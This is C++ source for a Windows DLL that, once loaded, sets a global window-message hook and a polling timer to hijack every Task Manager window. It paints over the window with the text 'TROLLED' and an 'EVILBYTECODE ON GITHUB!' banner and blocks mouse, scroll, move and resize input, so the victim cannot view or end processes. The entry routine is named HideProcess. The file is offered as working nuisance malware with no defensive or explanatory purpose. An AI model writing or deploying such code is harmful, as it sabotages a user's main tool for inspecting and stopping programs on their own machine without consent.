#include <windows.h>
#include "pch.h"
HHOOK g_hook = NULL;
UINT_PTR g_timer = 0;

BOOL IsTaskManager(HWND hwnd)
{
	char title[256];
	GetWindowTextA(hwnd, title, sizeof(title));
	return strstr(title, "Task Manager") != NULL;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

void HookWindow(HWND hwnd)
{
	if (!IsTaskManager(hwnd)) return;

	WNDPROC old = (WNDPROC)GetWindowLongPtr(hwnd, GWLP_WNDPROC);
	if (old != WindowProc)
	{
		SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)old);
		SetWindowLongPtr(hwnd, GWLP_WNDPROC, (LONG_PTR)WindowProc);
		InvalidateRect(hwnd, NULL, TRUE);
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (IsTaskManager(hwnd))
	{
		if (uMsg == WM_PAINT || uMsg == WM_ERASEBKGND || uMsg == WM_NCPAINT || uMsg == WM_PRINT)
		{
			HDC hdc = (uMsg == WM_PAINT) ? BeginPaint(hwnd, (PAINTSTRUCT*)&wParam) : (HDC)wParam;
			RECT rect;
			GetClientRect(hwnd, &rect);
			FillRect(hdc, &rect, (HBRUSH)GetStockObject(WHITE_BRUSH));
			SetBkMode(hdc, TRANSPARENT);
			SetTextColor(hdc, RGB(255, 0, 0));
			HFONT font = CreateFontW(72, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Arial");
			SelectObject(hdc, font);
			DrawTextA(hdc, "TROLLED", -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
			rect.top += 80;
			HFONT font2 = CreateFontW(24, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Arial");
			SelectObject(hdc, font2);
			DrawTextA(hdc, "EVILBYTECODE ON GITHUB!", -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
			DeleteObject(font2);
			DeleteObject(font);
			if (uMsg == WM_PAINT) EndPaint(hwnd, (PAINTSTRUCT*)&wParam);
			return 0;
		}
		InvalidateRect(hwnd, NULL, TRUE);
		UpdateWindow(hwnd);
		if (uMsg == WM_MOUSEMOVE || uMsg == WM_HSCROLL || uMsg == WM_VSCROLL || uMsg == WM_LBUTTONDOWN || uMsg == WM_LBUTTONUP || uMsg == WM_NCLBUTTONDOWN || uMsg == WM_NCLBUTTONUP || uMsg == WM_MOVING || uMsg == WM_SIZING)
		return 0;
	}
	WNDPROC old = (WNDPROC)GetWindowLongPtr(hwnd, GWLP_USERDATA);
	return old ? CallWindowProc(old, hwnd, uMsg, wParam, lParam) : DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		CWPSTRUCT* msg = (CWPSTRUCT*)lParam;
		if (msg->message == WM_CREATE || msg->message == WM_SHOWWINDOW)
		HookWindow(msg->hwnd);
	}
	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

VOID CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD)
{
	EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
		HookWindow(hwnd);
		if (IsTaskManager(hwnd)) InvalidateRect(hwnd, NULL, TRUE);
		EnumChildWindows(hwnd, [](HWND child, LPARAM) -> BOOL { HookWindow(child); return TRUE; }, 0);
		return TRUE;
		}, 0);
}

int HideProcess()
{
	g_hook = SetWindowsHookEx(WH_CALLWNDPROC, CallWndProc, GetModuleHandle(NULL), 0);
	g_timer = SetTimer(NULL, 0, 100, TimerProc);
	EnumWindows([](HWND hwnd, LPARAM) -> BOOL { HookWindow(hwnd); return TRUE; }, 0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE, DWORD ul_reason_for_call, LPVOID)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		HideProcess();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}